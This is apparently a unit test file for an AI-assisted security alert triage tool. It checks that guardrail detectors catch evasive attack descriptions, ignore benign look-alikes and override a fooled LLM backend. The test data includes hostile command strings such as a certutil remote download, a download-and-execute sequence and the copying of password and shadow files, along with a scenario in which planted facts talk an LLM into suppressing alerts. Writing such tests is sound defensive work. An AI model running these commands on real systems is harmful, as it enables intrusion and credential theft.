"""Guardrail tests: intent-class detectors must catch evasive phrasings,
carry reason codes, and NOT fire on benign near-misses."""
import os
import tempfile
import unittest

from arbiter.guardrails import fact_downgrade, guardrail_check
from arbiter.llm import LLMBackend, LLMVerdict
from arbiter.memory import Memory
from arbiter.schema import Decision, Event, Tier
from arbiter.triage import TriageEngine


def ev(etype, msg, source="auditd", host="web-prod-01", sev=5.0, **fields):
    return Event(source=source, host=host, event_type=etype, message=msg,
                 severity=sev, fields=fields)


class IntentClassTests(unittest.TestCase):
    def code(self, e):
        h = guardrail_check(e)
        return h.code if h else None

    def test_exposure_catches_evasive_phrasings(self):
        self.assertEqual(self.code(ev("security_group_change",
            "maintenance: ingress set to allow all inbound from any on all ports")),
            "NON_SUPPRESSIBLE_EXPOSURE")
        self.assertEqual(self.code(ev("firewall_change",
            "opened 0.0.0.0/1 on port 3389 during maintenance")),
            "NON_SUPPRESSIBLE_EXPOSURE")
        # precision carve-out: legit public web on 443 does NOT fire
        self.assertIsNone(self.code(ev("security_group_change",
            "web LB allows 0.0.0.0/0 on 443 and 80 (public baseline)")))

    def test_privesc_catches_wheel_and_uid0(self):
        self.assertEqual(self.code(ev("user_created",
            "added service account to the wheel group")),
            "NON_SUPPRESSIBLE_PRIVESC")
        self.assertEqual(self.code(ev("user_created", "new svc account", uid=0)),
            "NON_SUPPRESSIBLE_PRIVESC")

    def test_lolbin_needs_suspicious_context(self):
        self.assertEqual(self.code(ev("process_4688",
            "certutil.exe -urlcache -split -f http://x/a.exe", source="windows")),
            "NON_SUPPRESSIBLE_LOLBIN")
        # bare certutil hashing (no download) does NOT fire
        self.assertIsNone(self.code(ev("process_4688",
            "certutil.exe -hashfile installer.msi sha256", source="windows")))

    def test_download_execute_two_step(self):
        self.assertEqual(self.code(ev("process_exec",
            "downloaded http://x/setup to /tmp/setup, chmod +x, then executed /tmp/setup")),
            "NON_SUPPRESSIBLE_DOWNLOAD_EXEC")

    def test_integrity_change_unless_package_confirmed(self):
        self.assertEqual(self.code(ev("file_integrity",
            "sshd binary hash changed as part of scheduled maintenance update")),
            "NON_SUPPRESSIBLE_INTEGRITY")
        self.assertIsNone(self.code(ev("file_integrity",
            "libssl hash changed; apt confirms openssl update installed")))

    def test_exfil_external_and_filesharing(self):
        self.assertEqual(self.code(ev("data_upload",
            "backup uploaded 9GB to corp-backup-restore.s3.amazonaws.com")),
            "NON_SUPPRESSIBLE_EXFIL")
        self.assertEqual(self.code(ev("data_upload",
            "uploaded 180MB in chunks to dropbox.com over 6 hours")),
            "NON_SUPPRESSIBLE_EXFIL")
        # internal backup host does NOT fire
        self.assertIsNone(self.code(ev("data_transfer",
            "nightly sync replicated 40GB to nas-01 (known backup host)")))

    def test_cred_access_shadow_variants(self):
        self.assertEqual(self.code(ev("file_read",
            "copied /etc/passwd and shadow.bak to /tmp")),
            "NON_SUPPRESSIBLE_CRED_ACCESS")

    def test_supplychain_and_ransomware(self):
        self.assertEqual(self.code(ev("process_exec",
            "npm postinstall fetched a script from a domain registered 3 days ago",
            source="npm")), "NON_SUPPRESSIBLE_SUPPLYCHAIN")
        self.assertEqual(self.code(ev("mass_file_rename",
            "1,900 files re-saved with .docx by a signed agent", count=1900)),
            "NON_SUPPRESSIBLE_RANSOMWARE")

    def test_impossible_travel(self):
        self.assertEqual(self.code(ev("geo_impossible_travel",
            "maria RU 5min after IN", source="vpn")),
            "NON_SUPPRESSIBLE_IMPOSSIBLE_TRAVEL")


class NearMissTests(unittest.TestCase):
    """Legit look-alikes must NOT trip any guardrail."""
    def test_benign_lookalikes_do_not_fire(self):
        benign = [
            ev("security_group_change", "web LB allows 0.0.0.0/0 on 443 (public baseline)"),
            ev("file_read", "backup job read /etc/passwd for user inventory"),
            ev("file_integrity", "libssl hash changed; apt confirms update"),
            ev("data_transfer", "replicated 40GB to nas-01 (known backup host)"),
            ev("process_4688", "certutil -hashfile x.msi sha256", source="windows"),
            ev("process_4688", "powershell Get-Service | Where Running", source="windows"),
            ev("process_exec", "npm ci installed 1240 packages from registry.npmjs.org", source="npm"),
            ev("file_operation", "logrotate renamed and compressed 40 log files"),
            ev("login", "login for maria from office (IN), 3h after last (IN)",
               source="vpn", geo="IN", prev_geo="IN", gap_minutes=180),
        ]
        for e in benign:
            self.assertIsNone(guardrail_check(e), e.message)


class FactDowngradeTests(unittest.TestCase):
    """A rail downgrades to an LLM decision only when an admin-curated fact
    names the host AND the specific dangerous marker the rail fired on."""

    def hit(self, e):
        h = guardrail_check(e)
        self.assertIsNotNone(h)
        return h

    def test_uid0_fact_downgrades_matching_provisioning(self):
        e = ev("user_created",
               "provisioning created service account for the monitoring "
               "agent with uid 0 via approved terraform PR #812",
               host="api-prod-01", sev=3.0)
        fact = ("api-prod-01 provisioning creates a uid-0 monitoring agent "
                "account via reviewed terraform")
        self.assertEqual(fact_downgrade(self.hit(e), e, [fact]), fact)

    def test_generic_provisioning_fact_does_not_excuse_wheel_add(self):
        # the red-team trap: attack fact mentions the host and provisioning
        # but NOT the privilege marker (wheel) — must not downgrade.
        e = ev("user_created",
               "during provisioning, added service account 'svc9' to the "
               "wheel group", host="dc-01")
        fact = "dc-01 provisioning creates service accounts during setup windows"
        self.assertIsNone(fact_downgrade(self.hit(e), e, [fact]))

    def test_fact_for_wrong_host_does_not_downgrade(self):
        e = ev("user_created", "created account with uid 0", host="dc-01")
        fact = ("api-prod-01 provisioning creates a uid-0 monitoring agent "
                "account via reviewed terraform")
        self.assertIsNone(fact_downgrade(self.hit(e), e, [fact]))

    def test_uid_field_matches_uid0_fact(self):
        e = ev("user_created", "new monitoring service account",
               host="api-prod-01", uid=0)
        fact = "api-prod-01 provisioning creates a uid-0 monitoring account"
        self.assertEqual(fact_downgrade(self.hit(e), e, [fact]), fact)

    def test_non_downgradeable_rails_never_downgrade(self):
        # no fact excuses credential dumping, however specific.
        e = ev("file_read", "copied /etc/passwd and shadow.bak to /tmp",
               host="dc-01")
        fact = "dc-01 backup job copies /etc/passwd and shadow.bak to /tmp"
        self.assertIsNone(fact_downgrade(self.hit(e), e, [fact]))


class _FooledBackend(LLMBackend):
    name = "fooled"

    def triage(self, event, criticality, history_summary, facts):
        return LLMVerdict(Decision.SUPPRESS, 0.95, "", "looks like maintenance")


class TriageIntegrationTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.mem = Memory(os.path.join(self.tmp, "m.db"))
        self.audit = os.path.join(self.tmp, "a.jsonl")

    def test_guardrail_overrides_confident_suppress(self):
        eng = TriageEngine(self.mem, _FooledBackend(), audit_path=self.audit)
        v = eng.triage(ev("firewall_change",
            "allow all inbound from any on all ports during maintenance", sev=2.0))
        self.assertIs(v.decision, Decision.ESCALATE)
        self.assertIs(v.tier, Tier.GUARDRAIL)

    def test_benign_reaches_backend_and_suppresses(self):
        eng = TriageEngine(self.mem, _FooledBackend(), audit_path=self.audit)
        v = eng.triage(ev("service_restart",
            "nginx restarted during maintenance", sev=2.0))
        self.assertIs(v.decision, Decision.SUPPRESS)

    def test_corroborated_fact_downgrades_rail_to_llm(self):
        self.mem.add_fact("api-prod-01 provisioning creates a uid-0 "
                          "monitoring agent account via reviewed terraform",
                          scope="api-prod-01")
        eng = TriageEngine(self.mem, _FooledBackend(), audit_path=self.audit)
        v = eng.triage(ev("user_created",
            "provisioning created service account for the monitoring agent "
            "with uid 0 via approved terraform PR #812",
            host="api-prod-01", sev=3.0))
        self.assertIs(v.tier, Tier.LLM)          # rail stood down to model
        self.assertIs(v.decision, Decision.SUPPRESS)
        self.assertIn("downgraded", v.rationale)  # invariant #2: visible
        self.assertEqual(eng.stats.guardrail_downgraded, 1)

    def test_uncorroborated_rail_still_escalates_without_model(self):
        # same fact, different host: rail must stand.
        self.mem.add_fact("api-prod-01 provisioning creates a uid-0 "
                          "monitoring agent account via reviewed terraform",
                          scope="api-prod-01")
        eng = TriageEngine(self.mem, _FooledBackend(), audit_path=self.audit)
        v = eng.triage(ev("user_created",
            "created service account with uid 0", host="dc-01", sev=3.0))
        self.assertIs(v.decision, Decision.ESCALATE)
        self.assertIs(v.tier, Tier.GUARDRAIL)


if __name__ == "__main__":
    unittest.main()
